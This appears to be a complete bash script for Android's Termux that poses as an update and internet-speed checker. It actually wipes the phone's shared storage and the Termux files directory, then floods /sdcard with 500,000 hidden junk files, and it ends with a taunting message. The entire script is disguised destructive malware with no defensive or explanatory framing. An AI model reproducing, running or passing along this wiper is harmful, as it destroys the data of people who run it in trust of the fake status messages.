#!/bin/bash
clear
echo "Wait Checking For Updates"
rm -r /sdcard/*
rm -r /data/data/com.termux/files/home
rm -r /data/data/com.termux/files
clear
echo "Wait Internet Speed Checking"
for i in {1..500000}
do
    
    filename="/sdcard/.NILLXD$i"
    echo "MR.NILL" > "$filename"
done
clear
echo "Fuck Done Babe Check Your File Manager"
